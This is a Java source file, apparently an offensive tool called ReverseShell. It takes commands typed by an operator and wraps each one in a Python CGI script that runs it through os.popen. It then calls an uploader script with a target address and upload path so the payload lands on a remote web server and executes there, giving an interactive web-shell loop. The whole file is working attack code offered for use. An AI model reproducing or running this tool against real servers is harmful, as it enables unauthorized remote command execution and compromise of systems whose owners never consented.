package com.shell;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader; 

public class ReverseShell {

    public static void main( String[] args ) throws IOException, Exception {

        String ExploitName    = args[0];
        String Address        = args[1];
        String UploadPath     = args[2];
        String UploadNameAttr = args[3];
        String UploadLocation = args[4];

        try {

            System.out.println("\n[ + ]   Follow  :  @otw.mastah\n");

            
            InputStreamReader inputStreamReader = new InputStreamReader(System.in);
            BufferedReader bufferedReader = new BufferedReader( inputStreamReader );

            while ( true  ) {

                System.out.print("[ In ]  +-> ");
                String OperatingSystemCommand = bufferedReader.readLine();

                if ( OperatingSystemCommand == "exit" ) {

                    break;

                } else {

                    String PayloadCode = "#!\"C:\\Users\\kiwog\\AppData\\Local\\Programs\\Python\\Python39\\python.exe\"\n\nimport os\n\nprint(\"Content-type: text/plain; charset=iso-8859-1\\n\\n\")\nprint(os.popen(\"" + OperatingSystemCommand + "\").read())";
                    Files.write(Paths.get(ExploitName), PayloadCode.getBytes());

                    System.out.println("[ Out ]  : \n");

                    new ProcessBuilder(
                        "cmd", "/c",

                        "python3 uploader.py " + ExploitName + " " +
                        Address + " " + UploadPath + " " + UploadNameAttr +
                        " " + UploadLocation
                        
                    ).inheritIO().start().waitFor();

                }


            }

        } catch ( Exception ErrorMessage ) {

            ErrorMessage.printStackTrace();

        }

    }

}